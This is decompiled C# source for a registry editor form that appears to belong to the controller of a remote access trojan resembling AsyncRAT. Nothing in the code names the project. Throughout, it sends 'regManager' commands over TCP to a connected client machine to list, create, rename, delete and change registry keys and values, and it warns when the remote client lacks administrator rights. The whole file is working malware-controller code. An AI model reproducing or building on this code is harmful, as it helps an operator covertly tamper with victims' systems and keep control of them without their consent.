using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using Microsoft.Win32;
using Server.Connection;
using Server.Helper;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000065 RID: 101
	public partial class FormRegistryEditor : DarkForm
	{
		// Token: 0x170000B7 RID: 183
		// (get) Token: 0x06000406 RID: 1030 RVA: 0x00028A00 File Offset: 0x00028A00
		// (set) Token: 0x06000407 RID: 1031 RVA: 0x00028A08 File Offset: 0x00028A08
		public global::Form1 F { get; set; }

		// Token: 0x170000B8 RID: 184
		// (get) Token: 0x06000408 RID: 1032 RVA: 0x00028A14 File Offset: 0x00028A14
		// (set) Token: 0x06000409 RID: 1033 RVA: 0x00028A1C File Offset: 0x00028A1C
		internal Clients Client { get; set; }

		// Token: 0x170000B9 RID: 185
		// (get) Token: 0x0600040A RID: 1034 RVA: 0x00028A28 File Offset: 0x00028A28
		// (set) Token: 0x0600040B RID: 1035 RVA: 0x00028A30 File Offset: 0x00028A30
		internal Clients ParentClient { get; set; }

		// Token: 0x0600040C RID: 1036 RVA: 0x00028A3C File Offset: 0x00028A3C
		public FormRegistryEditor()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600040D RID: 1037 RVA: 0x00028A4C File Offset: 0x00028A4C
		private void FrmRegistryEditor_Load(object sender, EventArgs e)
		{
			if (!this.ParentClient.Admin)
			{
				MessageBox.Show("The client software is not running as administrator and therefore some functionality like Update, Create, Open and Delete may not work properly!", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
		}

		// Token: 0x0600040E RID: 1038 RVA: 0x00028A74 File Offset: 0x00028A74
		private void AddRootKey(RegistrySeeker.RegSeekerMatch match)
		{
			TreeNode treeNode = this.CreateNode(match.Key, match.Key, match.Data);
			treeNode.Nodes.Add(new TreeNode());
			this.tvRegistryDirectory.Nodes.Add(treeNode);
		}

		// Token: 0x0600040F RID: 1039 RVA: 0x00028AC4 File Offset: 0x00028AC4
		private TreeNode AddKeyToTree(TreeNode parent, RegistrySeeker.RegSeekerMatch subKey)
		{
			TreeNode treeNode = this.CreateNode(subKey.Key, subKey.Key, subKey.Data);
			parent.Nodes.Add(treeNode);
			if (subKey.HasSubKeys)
			{
				treeNode.Nodes.Add(new TreeNode());
			}
			return treeNode;
		}

		// Token: 0x06000410 RID: 1040 RVA: 0x00028B18 File Offset: 0x00028B18
		private TreeNode CreateNode(string key, string text, object tag)
		{
			return new TreeNode
			{
				Text = text,
				Name = key,
				Tag = tag
			};
		}

		// Token: 0x06000411 RID: 1041 RVA: 0x00028B34 File Offset: 0x00028B34
		public void AddKeys(string rootKey, RegistrySeeker.RegSeekerMatch[] matches)
		{
			if (string.IsNullOrEmpty(rootKey))
			{
				this.tvRegistryDirectory.BeginUpdate();
				foreach (RegistrySeeker.RegSeekerMatch match in matches)
				{
					this.AddRootKey(match);
				}
				this.tvRegistryDirectory.SelectedNode = this.tvRegistryDirectory.Nodes[0];
				this.tvRegistryDirectory.EndUpdate();
				return;
			}
			TreeNode treeNode = this.GetTreeNode(rootKey);
			if (treeNode != null)
			{
				this.tvRegistryDirectory.BeginUpdate();
				foreach (RegistrySeeker.RegSeekerMatch subKey in matches)
				{
					this.AddKeyToTree(treeNode, subKey);
				}
				treeNode.Expand();
				this.tvRegistryDirectory.EndUpdate();
			}
		}

		// Token: 0x06000412 RID: 1042 RVA: 0x00028BF8 File Offset: 0x00028BF8
		public void CreateNewKey(string rootKey, RegistrySeeker.RegSeekerMatch match)
		{
			TreeNode treeNode = this.GetTreeNode(rootKey);
			TreeNode treeNode2 = this.AddKeyToTree(treeNode, match);
			treeNode2.EnsureVisible();
			this.tvRegistryDirectory.SelectedNode = treeNode2;
			treeNode2.Expand();
			this.tvRegistryDirectory.LabelEdit = true;
			treeNode2.BeginEdit();
		}

		// Token: 0x06000413 RID: 1043 RVA: 0x00028C44 File Offset: 0x00028C44
		public void DeleteKey(string rootKey, string subKey)
		{
			TreeNode treeNode = this.GetTreeNode(rootKey);
			if (treeNode.Nodes.ContainsKey(subKey))
			{
				treeNode.Nodes.RemoveByKey(subKey);
			}
		}

		// Token: 0x06000414 RID: 1044 RVA: 0x00028C7C File Offset: 0x00028C7C
		public void RenameKey(string rootKey, string oldName, string newName)
		{
			TreeNode treeNode = this.GetTreeNode(rootKey);
			if (treeNode.Nodes.ContainsKey(oldName))
			{
				treeNode.Nodes[oldName].Text = newName;
				treeNode.Nodes[oldName].Name = newName;
				this.tvRegistryDirectory.SelectedNode = treeNode.Nodes[newName];
			}
		}

		// Token: 0x06000415 RID: 1045 RVA: 0x00028CE4 File Offset: 0x00028CE4
		private TreeNode GetTreeNode(string path)
		{
			string[] array = path.Split(new char[] { '\\' });
			TreeNode treeNode = this.tvRegistryDirectory.Nodes[array[0]];
			if (treeNode == null)
			{
				return null;
			}
			for (int i = 1; i < array.Length; i++)
			{
				treeNode = treeNode.Nodes[array[i]];
				if (treeNode == null)
				{
					return null;
				}
			}
			return treeNode;
		}

		// Token: 0x06000416 RID: 1046 RVA: 0x00028D54 File Offset: 0x00028D54
		public void CreateValue(string keyPath, RegistrySeeker.RegValueData value)
		{
			TreeNode treeNode = this.GetTreeNode(keyPath);
			if (treeNode != null)
			{
				List<RegistrySeeker.RegValueData> list = ((RegistrySeeker.RegValueData[])treeNode.Tag).ToList<RegistrySeeker.RegValueData>();
				list.Add(value);
				treeNode.Tag = list.ToArray();
				if (this.tvRegistryDirectory.SelectedNode == treeNode)
				{
					RegistryValueLstItem registryValueLstItem = new RegistryValueLstItem(value);
					this.lstRegistryValues.Items.Add(registryValueLstItem);
					this.lstRegistryValues.SelectedIndices.Clear();
					registryValueLstItem.Selected = true;
					this.lstRegistryValues.LabelEdit = true;
					registryValueLstItem.BeginEdit();
				}
				this.tvRegistryDirectory.SelectedNode = treeNode;
			}
		}

		// Token: 0x06000417 RID: 1047 RVA: 0x00028DF8 File Offset: 0x00028DF8
		public void DeleteValue(string keyPath, string valueName)
		{
			TreeNode treeNode = this.GetTreeNode(keyPath);
			if (treeNode != null)
			{
				if (!RegValueHelper.IsDefaultValue(valueName))
				{
					treeNode.Tag = ((RegistrySeeker.RegValueData[])treeNode.Tag).Where((RegistrySeeker.RegValueData value) => value.Name != valueName).ToArray<RegistrySeeker.RegValueData>();
					if (this.tvRegistryDirectory.SelectedNode == treeNode)
					{
						this.lstRegistryValues.Items.RemoveByKey(valueName);
					}
				}
				else
				{
					RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == valueName);
					if (this.tvRegistryDirectory.SelectedNode == treeNode)
					{
						RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == valueName);
						if (registryValueLstItem != null)
						{
							registryValueLstItem.Data = regValueData.Kind.RegistryTypeToString(null);
						}
					}
				}
				this.tvRegistryDirectory.SelectedNode = treeNode;
			}
		}

		// Token: 0x06000418 RID: 1048 RVA: 0x00028EFC File Offset: 0x00028EFC
		public void RenameValue(string keyPath, string oldName, string newName)
		{
			TreeNode treeNode = this.GetTreeNode(keyPath);
			if (treeNode != null)
			{
				((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == oldName).Name = newName;
				if (this.tvRegistryDirectory.SelectedNode == treeNode)
				{
					RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == oldName);
					if (registryValueLstItem != null)
					{
						registryValueLstItem.RegName = newName;
					}
				}
				this.tvRegistryDirectory.SelectedNode = treeNode;
			}
		}

		// Token: 0x06000419 RID: 1049 RVA: 0x00028F98 File Offset: 0x00028F98
		public void ChangeValue(string keyPath, RegistrySeeker.RegValueData value)
		{
			TreeNode treeNode = this.GetTreeNode(keyPath);
			if (treeNode != null)
			{
				RegistrySeeker.RegValueData dest = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == value.Name);
				this.ChangeRegistryValue(value, dest);
				if (this.tvRegistryDirectory.SelectedNode == treeNode)
				{
					RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == value.Name);
					if (registryValueLstItem != null)
					{
						registryValueLstItem.Data = RegValueHelper.RegistryValueToString(value);
					}
				}
				this.tvRegistryDirectory.SelectedNode = treeNode;
			}
		}

		// Token: 0x0600041A RID: 1050 RVA: 0x00029044 File Offset: 0x00029044
		private void ChangeRegistryValue(RegistrySeeker.RegValueData source, RegistrySeeker.RegValueData dest)
		{
			if (source.Kind != dest.Kind)
			{
				return;
			}
			dest.Data = source.Data;
		}

		// Token: 0x0600041B RID: 1051 RVA: 0x00029064 File Offset: 0x00029064
		private void UpdateLstRegistryValues(TreeNode node)
		{
			this.selectedStripStatusLabel.Text = node.FullPath;
			RegistrySeeker.RegValueData[] values = (RegistrySeeker.RegValueData[])node.Tag;
			this.PopulateLstRegistryValues(values);
		}

		// Token: 0x0600041C RID: 1052 RVA: 0x0002909C File Offset: 0x0002909C
		private void PopulateLstRegistryValues(RegistrySeeker.RegValueData[] values)
		{
			this.lstRegistryValues.BeginUpdate();
			this.lstRegistryValues.Items.Clear();
			values = values.OrderBy((RegistrySeeker.RegValueData value) => value.Name).ToArray<RegistrySeeker.RegValueData>();
			RegistrySeeker.RegValueData[] array = values;
			for (int i = 0; i < array.Length; i++)
			{
				RegistryValueLstItem value2 = new RegistryValueLstItem(array[i]);
				this.lstRegistryValues.Items.Add(value2);
			}
			this.lstRegistryValues.EndUpdate();
		}

		// Token: 0x0600041D RID: 1053 RVA: 0x00029134 File Offset: 0x00029134
		private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
		{
			if (e.Label == null)
			{
				this.tvRegistryDirectory.LabelEdit = false;
				return;
			}
			e.CancelEdit = true;
			if (e.Label.Length <= 0)
			{
				MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				e.Node.BeginEdit();
				return;
			}
			if (e.Node.Parent.Nodes.ContainsKey(e.Label))
			{
				MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				e.Node.BeginEdit();
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "RenameRegistryKey";
			msgPack.ForcePathObject("OldKeyName").AsString = e.Node.Name;
			msgPack.ForcePathObject("NewKeyName").AsString = e.Label;
			msgPack.ForcePathObject("ParentPath").AsString = e.Node.Parent.FullPath;
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			this.tvRegistryDirectory.LabelEdit = false;
		}

		// Token: 0x0600041E RID: 1054 RVA: 0x00029280 File Offset: 0x00029280
		private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
		{
			TreeNode node = e.Node;
			if (string.IsNullOrEmpty(node.FirstNode.Name))
			{
				this.tvRegistryDirectory.SuspendLayout();
				node.Nodes.Clear();
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "LoadRegistryKey";
				msgPack.ForcePathObject("RootKeyName").AsString = node.FullPath;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				Thread.Sleep(500);
				this.tvRegistryDirectory.ResumeLayout();
				e.Cancel = true;
			}
		}

		// Token: 0x0600041F RID: 1055 RVA: 0x00029344 File Offset: 0x00029344
		private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
		{
			if (e.Button == MouseButtons.Right)
			{
				this.tvRegistryDirectory.SelectedNode = e.Node;
				Point position = new Point(e.X, e.Y);
				this.CreateTreeViewMenuStrip();
				this.tv_ContextMenuStrip.Show(this.tvRegistryDirectory, position);
			}
		}

		// Token: 0x06000420 RID: 1056 RVA: 0x000293A4 File Offset: 0x000293A4
		private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
		{
			this.UpdateLstRegistryValues(e.Node);
		}

		// Token: 0x06000421 RID: 1057 RVA: 0x000293B4 File Offset: 0x000293B4
		private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Delete && this.GetDeleteState())
			{
				this.deleteRegistryKey_Click(this, e);
			}
		}

		// Token: 0x06000422 RID: 1058 RVA: 0x000293D8 File Offset: 0x000293D8
		private void CreateEditToolStrip()
		{
			this.modifyToolStripMenuItem1.Visible = (this.modifyBinaryDataToolStripMenuItem1.Visible = (this.modifyNewtoolStripSeparator.Visible = this.lstRegistryValues.Focused));
			this.modifyToolStripMenuItem1.Enabled = (this.modifyBinaryDataToolStripMenuItem1.Enabled = this.lstRegistryValues.SelectedItems.Count == 1);
			this.renameToolStripMenuItem2.Enabled = this.GetRenameState();
			this.deleteToolStripMenuItem2.Enabled = this.GetDeleteState();
		}

		// Token: 0x06000423 RID: 1059 RVA: 0x0002946C File Offset: 0x0002946C
		private void CreateTreeViewMenuStrip()
		{
			this.renameToolStripMenuItem.Enabled = this.tvRegistryDirectory.SelectedNode.Parent != null;
			this.deleteToolStripMenuItem.Enabled = this.tvRegistryDirectory.SelectedNode.Parent != null;
		}

		// Token: 0x06000424 RID: 1060 RVA: 0x000294BC File Offset: 0x000294BC
		private void CreateListViewMenuStrip()
		{
			this.modifyToolStripMenuItem.Enabled = (this.modifyBinaryDataToolStripMenuItem.Enabled = this.lstRegistryValues.SelectedItems.Count == 1);
			this.renameToolStripMenuItem1.Enabled = this.lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(this.lstRegistryValues.SelectedItems[0].Name);
			this.deleteToolStripMenuItem1.Enabled = this.tvRegistryDirectory.SelectedNode != null && this.lstRegistryValues.SelectedItems.Count > 0;
		}

		// Token: 0x06000425 RID: 1061 RVA: 0x00029574 File Offset: 0x00029574
		private void editToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
		{
			this.CreateEditToolStrip();
		}

		// Token: 0x06000426 RID: 1062 RVA: 0x0002957C File Offset: 0x0002957C
		private void menuStripExit_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000427 RID: 1063 RVA: 0x00029584 File Offset: 0x00029584
		private void menuStripDelete_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.Focused)
			{
				this.deleteRegistryKey_Click(this, e);
				return;
			}
			if (this.lstRegistryValues.Focused)
			{
				this.deleteRegistryValue_Click(this, e);
			}
		}

		// Token: 0x06000428 RID: 1064 RVA: 0x000295B8 File Offset: 0x000295B8
		private void menuStripRename_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.Focused)
			{
				this.renameRegistryKey_Click(this, e);
				return;
			}
			if (this.lstRegistryValues.Focused)
			{
				this.renameRegistryValue_Click(this, e);
			}
		}

		// Token: 0x06000429 RID: 1065 RVA: 0x000295EC File Offset: 0x000295EC
		private void lstRegistryKeys_MouseClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Right)
			{
				Point position = new Point(e.X, e.Y);
				if (this.lstRegistryValues.GetItemAt(position.X, position.Y) == null)
				{
					this.lst_ContextMenuStrip.Show(this.lstRegistryValues, position);
					return;
				}
				this.CreateListViewMenuStrip();
				this.selectedItem_ContextMenuStrip.Show(this.lstRegistryValues, position);
			}
		}

		// Token: 0x0600042A RID: 1066 RVA: 0x0002966C File Offset: 0x0002966C
		private void lstRegistryKeys_AfterLabelEdit(object sender, LabelEditEventArgs e)
		{
			if (e.Label == null || this.tvRegistryDirectory.SelectedNode == null)
			{
				this.lstRegistryValues.LabelEdit = false;
				return;
			}
			e.CancelEdit = true;
			int item = e.Item;
			if (e.Label.Length <= 0)
			{
				MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				this.lstRegistryValues.Items[item].BeginEdit();
				return;
			}
			if (this.lstRegistryValues.Items.ContainsKey(e.Label))
			{
				MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				this.lstRegistryValues.Items[item].BeginEdit();
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "RenameRegistryValue";
			msgPack.ForcePathObject("OldValueName").AsString = this.lstRegistryValues.Items[item].Name;
			msgPack.ForcePathObject("NewValueName").AsString = e.Label;
			msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			this.lstRegistryValues.LabelEdit = false;
		}

		// Token: 0x0600042B RID: 1067 RVA: 0x000297E8 File Offset: 0x000297E8
		private void lstRegistryKeys_KeyUp(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Delete && this.GetDeleteState())
			{
				this.deleteRegistryValue_Click(this, e);
			}
		}

		// Token: 0x0600042C RID: 1068 RVA: 0x0002980C File Offset: 0x0002980C
		private void createNewRegistryKey_Click(object sender, EventArgs e)
		{
			if (!this.tvRegistryDirectory.SelectedNode.IsExpanded && this.tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
			{
				this.tvRegistryDirectory.AfterExpand += this.createRegistryKey_AfterExpand;
				this.tvRegistryDirectory.SelectedNode.Expand();
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
			msgPack.ForcePathObject("Command").AsString = "CreateRegistryKey";
			msgPack.ForcePathObject("ParentPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x0600042D RID: 1069 RVA: 0x000298E4 File Offset: 0x000298E4
		private void deleteRegistryKey_Click(object sender, EventArgs e)
		{
			string text = "Are you sure you want to permanently delete this key and all of its subkeys?";
			string caption = "Confirm Key Delete";
			if (MessageBox.Show(text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				string fullPath = this.tvRegistryDirectory.SelectedNode.Parent.FullPath;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "DeleteRegistryKey";
				msgPack.ForcePathObject("KeyName").AsString = this.tvRegistryDirectory.SelectedNode.Name;
				msgPack.ForcePathObject("ParentPath").AsString = fullPath;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x0600042E RID: 1070 RVA: 0x000299A4 File Offset: 0x000299A4
		private void renameRegistryKey_Click(object sender, EventArgs e)
		{
			this.tvRegistryDirectory.LabelEdit = true;
			this.tvRegistryDirectory.SelectedNode.BeginEdit();
		}

		// Token: 0x0600042F RID: 1071 RVA: 0x000299C4 File Offset: 0x000299C4
		private void createStringRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "1";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000430 RID: 1072 RVA: 0x00029A68 File Offset: 0x00029A68
		private void createBinaryRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "3";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000431 RID: 1073 RVA: 0x00029B0C File Offset: 0x00029B0C
		private void createDwordRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "4";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000432 RID: 1074 RVA: 0x00029BB0 File Offset: 0x00029BB0
		private void createQwordRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "11";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000433 RID: 1075 RVA: 0x00029C54 File Offset: 0x00029C54
		private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "7";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000434 RID: 1076 RVA: 0x00029CF8 File Offset: 0x00029CF8
		private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
		{
			if (this.tvRegistryDirectory.SelectedNode != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
				msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
				msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
				msgPack.ForcePathObject("Kindstring").AsString = "2";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x06000435 RID: 1077 RVA: 0x00029D9C File Offset: 0x00029D9C
		private void deleteRegistryValue_Click(object sender, EventArgs e)
		{
			string text = "Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + ((this.lstRegistryValues.SelectedItems.Count == 1) ? "this value?" : "these values?");
			string caption = "Confirm Value Delete";
			if (MessageBox.Show(text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				foreach (object obj in this.lstRegistryValues.SelectedItems)
				{
					if (obj.GetType() == typeof(RegistryValueLstItem))
					{
						RegistryValueLstItem registryValueLstItem = (RegistryValueLstItem)obj;
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
						msgPack.ForcePathObject("Command").AsString = "DeleteRegistryValue";
						msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
						msgPack.ForcePathObject("ValueName").AsString = registryValueLstItem.RegName;
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
					}
				}
			}
		}

		// Token: 0x06000436 RID: 1078 RVA: 0x00029EEC File Offset: 0x00029EEC
		private void renameRegistryValue_Click(object sender, EventArgs e)
		{
			this.lstRegistryValues.LabelEdit = true;
			this.lstRegistryValues.SelectedItems[0].BeginEdit();
		}

		// Token: 0x06000437 RID: 1079 RVA: 0x00029F10 File Offset: 0x00029F10
		private void modifyRegistryValue_Click(object sender, EventArgs e)
		{
			this.CreateEditForm(false);
		}

		// Token: 0x06000438 RID: 1080 RVA: 0x00029F1C File Offset: 0x00029F1C
		private void modifyBinaryDataRegistryValue_Click(object sender, EventArgs e)
		{
			this.CreateEditForm(true);
		}

		// Token: 0x06000439 RID: 1081 RVA: 0x00029F28 File Offset: 0x00029F28
		private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
		{
			if (e.Node == this.tvRegistryDirectory.SelectedNode)
			{
				this.createNewRegistryKey_Click(this, e);
				this.tvRegistryDirectory.AfterExpand -= this.createRegistryKey_AfterExpand;
			}
		}

		// Token: 0x0600043A RID: 1082 RVA: 0x00029F60 File Offset: 0x00029F60
		private bool GetDeleteState()
		{
			if (this.lstRegistryValues.Focused)
			{
				return this.lstRegistryValues.SelectedItems.Count > 0;
			}
			return this.tvRegistryDirectory.Focused && this.tvRegistryDirectory.SelectedNode != null && this.tvRegistryDirectory.SelectedNode.Parent != null;
		}

		// Token: 0x0600043B RID: 1083 RVA: 0x00029FCC File Offset: 0x00029FCC
		private bool GetRenameState()
		{
			if (this.lstRegistryValues.Focused)
			{
				return this.lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(this.lstRegistryValues.SelectedItems[0].Name);
			}
			return this.tvRegistryDirectory.Focused && this.tvRegistryDirectory.SelectedNode != null && this.tvRegistryDirectory.SelectedNode.Parent != null;
		}

		// Token: 0x0600043C RID: 1084 RVA: 0x0002A05C File Offset: 0x0002A05C
		private Form GetEditForm(RegistrySeeker.RegValueData value, RegistryValueKind valueKind)
		{
			switch (valueKind)
			{
			case RegistryValueKind.String:
			case RegistryValueKind.ExpandString:
				return new FormRegValueEditString(value);
			case RegistryValueKind.Binary:
				return new FormRegValueEditBinary(value);
			case RegistryValueKind.DWord:
			case RegistryValueKind.QWord:
				return new FormRegValueEditWord(value);
			case RegistryValueKind.MultiString:
				return new FormRegValueEditMultiString(value);
			}
			return null;
		}

		// Token: 0x0600043D RID: 1085 RVA: 0x0002A0C4 File Offset: 0x0002A0C4
		private void CreateEditForm(bool isBinary)
		{
			string fullPath = this.tvRegistryDirectory.SelectedNode.FullPath;
			string name = this.lstRegistryValues.SelectedItems[0].Name;
			RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])this.tvRegistryDirectory.SelectedNode.Tag).ToList<RegistrySeeker.RegValueData>().Find((RegistrySeeker.RegValueData item) => item.Name == name);
			RegistryValueKind valueKind = (isBinary ? RegistryValueKind.Binary : regValueData.Kind);
			using (Form editForm = this.GetEditForm(regValueData, valueKind))
			{
				if (editForm.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
					msgPack.ForcePathObject("Command").AsString = "ChangeRegistryValue";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
		}

		// Token: 0x0600043E RID: 1086 RVA: 0x0002A1CC File Offset: 0x0002A1CC
		public void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x0600043F RID: 1087 RVA: 0x0002A22C File Offset: 0x0002A22C
		private void FormRegistryEditor_FormClosed(object sender, FormClosedEventArgs e)
		{
			ThreadPool.QueueUserWorkItem(delegate(object o)
			{
				Clients client = this.Client;
				if (client == null)
				{
					return;
				}
				client.Disconnected();
			});
		}
	}
}
